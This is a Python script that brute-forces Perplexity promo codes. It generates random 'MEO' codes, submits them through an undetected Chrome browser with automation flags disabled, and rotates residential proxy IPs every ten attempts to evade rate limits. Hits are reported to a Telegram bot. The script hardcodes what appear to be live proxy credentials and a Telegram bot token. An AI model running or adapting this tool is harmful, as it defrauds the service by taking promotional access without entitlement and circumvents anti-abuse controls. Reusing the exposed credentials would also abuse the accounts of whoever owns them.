import concurrent.futures
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException, TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import random
import string
import time
import os
import zipfile
import tempfile
import requests

# Configuration
NUM_CODES_TO_TEST = 1000  # Number of random codes to test
MAX_WORKERS = 1  # Single worker at a time
CODES_PER_WORKER = 10  # Number of codes each worker tries before IP change

# Proxy Configuration (Rotating residential proxy)
PROXY_HOST = "p.webshare.io"
PROXY_PORT = "80"
PROXY_USERNAME = "tzddwtgp-rotate"
PROXY_PASSWORD = "7ueyopt3s288"
PROXY_URL = f"http://{PROXY_USERNAME}:{PROXY_PASSWORD}@{PROXY_HOST}:{PROXY_PORT}"

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = "7642033573:AAHV4jyqAa_LMCRVs1NVXHZ5Gr-yMg-ocxU"
TELEGRAM_CHAT_ID = None  # Will be set to the first person who messages the bot

# URL to visit
url = "https://www.perplexity.ai/join/p/priority?code"

def create_proxy_extension(host, port, username, password, worker_id=0, batch_id=0):
    """Create a Chrome extension for proxy authentication with unique worker and batch ID"""
    import zipfile
    import tempfile
    import threading
    
    manifest_json = f"""
    {{
        "version": "1.0.{batch_id}",
        "manifest_version": 2,
        "name": "Chrome Proxy Batch {batch_id}",
        "permissions": [
            "proxy",
            "tabs",
            "unlimitedStorage",
            "storage",
            "<all_urls>",
            "webRequest",
            "webRequestBlocking"
        ],
        "background": {{
            "scripts": ["background.js"]
        }},
        "minimum_chrome_version":"22.0.0"
    }}
    """
    
    background_js = f"""
    var config = {{
            mode: "fixed_servers",
            rules: {{
              singleProxy: {{
                scheme: "http",
                host: "{host}",
                port: parseInt({port})
              }},
              bypassList: ["localhost"]
            }}
          }};

    chrome.proxy.settings.set({{value: config, scope: "regular"}}, function() {{}});

    function callbackFn(details) {{
        return {{
            authCredentials: {{
                username: "{username}",
                password: "{password}"
            }}
        }};
    }}

    chrome.webRequest.onAuthRequired.addListener(
                callbackFn,
                {{urls: ["<all_urls>"]}},
                ['blocking']
    );
    """
    
    # Create unique temporary directory for each batch
    thread_id = threading.get_ident()
    temp_dir = tempfile.mkdtemp(prefix=f"proxy_ext_batch_{batch_id}_{thread_id}_")
    manifest_path = os.path.join(temp_dir, "manifest.json")
    background_path = os.path.join(temp_dir, "background.js")
    
    with open(manifest_path, "w") as f:
        f.write(manifest_json)
    with open(background_path, "w") as f:
        f.write(background_js)
    
    # Create zip file with unique name
    extension_path = os.path.join(temp_dir, f"proxy_auth_extension_batch_{batch_id}_{thread_id}.zip")
    with zipfile.ZipFile(extension_path, 'w') as zip_file:
        zip_file.write(manifest_path, "manifest.json")
        zip_file.write(background_path, "background.js")
    
    return extension_path

def send_telegram_message(message):
    """Send a message to Telegram"""
    global TELEGRAM_CHAT_ID
    
    if not TELEGRAM_CHAT_ID:
        # Get the chat ID from recent messages
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
            response = requests.get(url)
            data = response.json()
            
            if data['ok'] and data['result']:
                TELEGRAM_CHAT_ID = data['result'][-1]['message']['chat']['id']
                print(f"Using Telegram chat ID: {TELEGRAM_CHAT_ID}", flush=True)
            else:
                print("No Telegram messages found. Send a message to the bot first.", flush=True)
                return False
        except Exception as e:
            print(f"Error getting Telegram chat ID: {e}", flush=True)
            return False
    
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        response = requests.post(url, data=data)
        return response.json()['ok']
    except Exception as e:
        print(f"Error sending Telegram message: {e}", flush=True)
        return False

def generate_random_code():
    """Generate a random MEO code with 9 additional characters (A-Z, 0-9)"""
    characters = string.ascii_uppercase + string.digits
    random_part = ''.join(random.choices(characters, k=9))
    return f"MEO{random_part}"

# Function to check multiple codes in the same browser session
def check_code_batch(codes, batch_id=0):
    import threading
    worker_id = threading.get_ident() % 1000  # Get unique worker ID
    results = []  # Store results for all codes in this batch
    driver = None
    
    try:
        # Set up undetected Chrome with incognito mode and proxy
        options = uc.ChromeOptions()
        options.add_argument("--incognito")
        # Removed headless for local debugging
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--disable-extensions-except")
        options.add_argument("--disable-plugins-discovery")
        options.add_argument(f"--user-data-dir={tempfile.mkdtemp(prefix=f'chrome_worker_{worker_id}_')}")
        
        # Set Chrome binary location for Windows/Linux/macOS
        import os
        import glob
        import subprocess
        import platform
        
        # Detect operating system and set appropriate paths
        system = platform.system().lower()
        chrome_binary = None
        
        if system == "windows":
            # Windows Chrome paths
            windows_chrome_paths = [
                os.path.expandvars(r"%PROGRAMFILES%\Google\Chrome\Application\chrome.exe"),
                os.path.expandvars(r"%PROGRAMFILES(X86)%\Google\Chrome\Application\chrome.exe"),
                os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe"),
                r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
            ]
            
            for path in windows_chrome_paths:
                if os.path.exists(path):
                    chrome_binary = path
                    break
        else:
            # Linux/Unix Chrome paths
            chromium_paths = [
                "/usr/bin/google-chrome-stable",
                "/usr/bin/google-chrome",
                "/usr/bin/chromium",
                "/usr/bin/chromium-browser", 
                "/opt/google/chrome/chrome"
            ]
            
            # Check nixpacks chromium location
            nix_chromium = glob.glob("/nix/store/*/bin/chromium")
            if nix_chromium:
                chromium_paths.insert(0, nix_chromium[0])
            
            # Try which command
            try:
                which_chromium = subprocess.check_output(["which", "chromium"], stderr=subprocess.DEVNULL).decode().strip()
                if which_chromium:
                    chromium_paths.insert(0, which_chromium)
            except:
                pass
                
            # Check all paths
            for path in chromium_paths:
                if os.path.exists(path):
                    chrome_binary = path
                    break
                
        if chrome_binary:
            options.binary_location = chrome_binary
        else:
            print("ERROR: Chrome not found! Please install Google Chrome.", flush=True)
            return [(code, "Chrome not found") for code in codes]
        
        # Add proxy with authentication using Chrome extension method
        proxy_extension = create_proxy_extension(PROXY_HOST, PROXY_PORT, PROXY_USERNAME, PROXY_PASSWORD, worker_id, batch_id)
        options.add_extension(proxy_extension)
        
        print(f"Creating browser for batch {batch_id} with {len(codes)} codes", flush=True)
        driver = uc.Chrome(options=options, version_main=None)
    except Exception as e:
        return [(code, f"Driver creation error: {str(e)}") for code in codes]
    
    try:
        # Process each code in the same browser session
        for i, code in enumerate(codes):
            try:
                print(f"Testing code {i+1}/{len(codes)}: {code}", flush=True)
                
                # Navigate to the page (or refresh if not first code)
                if i == 0:
                    print(f"Navigating to {url}...", flush=True)
                    driver.get(url)
                else:
                    print(f"Refreshing page for next code...", flush=True)
                    driver.refresh()
                
                # Wait for the input field to be present
                print(f"Waiting for input field...", flush=True)
                wait = WebDriverWait(driver, 15)
                code_input = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, 'input[placeholder="Promo Code"]')))
                print(f"Found input field", flush=True)
                
                # Enter the code
                code_input.clear()
                code_input.send_keys(code)
                
                # Find and click the submit button
                submit_button = driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]')
                submit_button.click()
                
                # Wait for response message to appear
                import time
                time.sleep(2)  # Give page time to fully load
                
                try:
                    error_message_element = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, 'div.text-caution')))
                    error_message = error_message_element.text
                    print(f"DEBUG: Found error message: '{error_message}'", flush=True)
                    
                    if "already been redeemed" in error_message.lower():
                        results.append((code, f"Already redeemed: {error_message}"))
                    elif "not eligible in your region" in error_message.lower():
                        results.append((code, f"Region restricted: {error_message}"))
                    elif "invalid" in error_message.lower() or "not valid" in error_message.lower():
                        results.append((code, f"Invalid code: {error_message}"))
                    else:
                        results.append((code, f"Error: {error_message}"))
                except TimeoutException:
                    print("DEBUG: No error message found, checking page content...", flush=True)
                    # If no error message, check for success
                    page_text = driver.page_source.lower()
                    print(f"DEBUG: Page contains 'success': {'success' in page_text}", flush=True)
                    print(f"DEBUG: Page contains 'welcome': {'welcome' in page_text}", flush=True)
                    if "success" in page_text or "welcome" in page_text or "applied" in page_text:
                        results.append((code, "Success"))
                    else:
                        results.append((code, "Unknown response"))
                        
            except (NoSuchElementException, TimeoutException) as e:
                results.append((code, f"Error: {str(e)}"))
            except Exception as e:
                print(f"Browser error for {code}: {str(e)}", flush=True)
                results.append((code, f"Browser error: {str(e)}"))
                
            # Small delay between codes
            if i < len(codes) - 1:
                time.sleep(1)
    finally:
        try:
            print(f"Closing browser for batch {batch_id}...", flush=True)
            if driver:
                driver.quit()
        except Exception as e:
            print(f"Error closing browser: {str(e)}", flush=True)
    
    return results

def main():
    print(f"Starting random code generation and testing...")
    print(f"Will test MEO3KPQ7ZR5Q first, then {NUM_CODES_TO_TEST - 1} random codes")
    print(f"Using rotating residential proxy: {PROXY_HOST}:{PROXY_PORT}")
    print(f"Testing {CODES_PER_WORKER} codes per worker before changing IP")
    print("=" * 50)
    
    # Send start message to Telegram
    start_msg = f"🚀 <b>Perplexity Code Test Started</b>\n\n"
    start_msg += f"📊 Testing MEO3KPQ7ZR5Q first, then {NUM_CODES_TO_TEST - 1} random codes\n"
    start_msg += f"🌍 Using rotating residential proxy: {PROXY_HOST}:{PROXY_PORT}\n"
    start_msg += f"🔄 {CODES_PER_WORKER} codes per worker before IP change\n"
    start_msg += f"⏰ Started: {time.strftime('%Y-%m-%d %H:%M:%S')}"
    send_telegram_message(start_msg)
    
    # Start with specific test code, then generate random codes
    codes = ["MEO3KPQ7ZR5Q"]  # Test this specific code first
    codes.extend([generate_random_code() for _ in range(NUM_CODES_TO_TEST - 1)])  # Then add random codes
    
    # Test codes and send live results
    working_codes = []
    completed = 0
    
    # Process codes in batches of CODES_PER_WORKER
    for batch_start in range(0, len(codes), CODES_PER_WORKER):
        batch_end = min(batch_start + CODES_PER_WORKER, len(codes))
        batch_codes = codes[batch_start:batch_end]
        batch_id = batch_start // CODES_PER_WORKER + 1
        
        print(f"\n🔄 Starting new worker batch {batch_id} ({batch_start + 1}-{batch_end} of {len(codes)})", flush=True)
        print(f"📡 Using new IP rotation for batch {batch_id}", flush=True)
        
        # Process the batch of codes in the same browser session
        try:
            batch_results = check_code_batch(batch_codes, batch_id)
        except Exception as e:
            print(f"Error testing batch {batch_id}: {str(e)}", flush=True)
            batch_results = [(code, f"Error: {str(e)}") for code in batch_codes]
        
        # Process results from the batch
        for result_code, status in batch_results:
            completed += 1
            
            # Format result for display and Telegram
            send_to_telegram = False
            
            if status == "Success":
                display_msg = f"✅ Code {result_code}: SUCCESS!"
                telegram_msg = f"🎉 <b>SUCCESS!</b>\n<code>{result_code}</code>\n✅ Working code found!"
                working_codes.append(result_code)
                send_to_telegram = True
            elif "Already redeemed" in str(status):
                display_msg = f"❌ Code {result_code}: Already redeemed"
                telegram_msg = f"❌ <code>{result_code}</code>\n🔄 Already redeemed"
                send_to_telegram = True
            elif "Region restricted" in str(status):
                display_msg = f"🌍 Code {result_code}: Region restricted"
                telegram_msg = f"🌍 <code>{result_code}</code>\n🚫 Region restricted"
                send_to_telegram = True
            elif "Invalid" in str(status):
                display_msg = f"🚫 Code {result_code}: Invalid"
                # Don't send invalid codes to Telegram
                send_to_telegram = False
            else:
                display_msg = f"❓ Code {result_code}: {status}"
                # Don't send unknown status to Telegram
                send_to_telegram = False
            
            print(f"[{completed}/{NUM_CODES_TO_TEST}] {display_msg}", flush=True)
            
            # Send individual result to Telegram only for specific statuses
            if send_to_telegram:
                progress_msg = f"[{completed}/{NUM_CODES_TO_TEST}] {telegram_msg}"
                send_telegram_message(progress_msg)
        
        # Add delay between batches to allow IP rotation
        if batch_end < len(codes):
            print(f"⏳ Waiting 5 seconds before next worker batch for IP rotation...", flush=True)
            time.sleep(5)
    
    # Send final summary to Telegram
    summary_msg = f"📋 <b>Test Completed!</b>\n\n"
    summary_msg += f"📊 Tested: {NUM_CODES_TO_TEST} codes\n"
    summary_msg += f"✅ Working: {len(working_codes)} codes\n"
    summary_msg += f"⏰ Finished: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
    
    if working_codes:
        summary_msg += f"🎉 <b>WORKING CODES:</b>\n"
        for code in working_codes:
            summary_msg += f"<code>{code}</code>\n"
    else:
        summary_msg += f"😔 No working codes found this time"
    
    send_telegram_message(summary_msg)
    
    print(f"\n" + "=" * 50)
    print(f"Testing completed!")
    print(f"Working codes found: {len(working_codes)}")
    if working_codes:
        print("🎉 WORKING CODES:")
        for code in working_codes:
            print(f"   {code}")
    print(f"Results sent to Telegram!")

if __name__ == "__main__":
    main()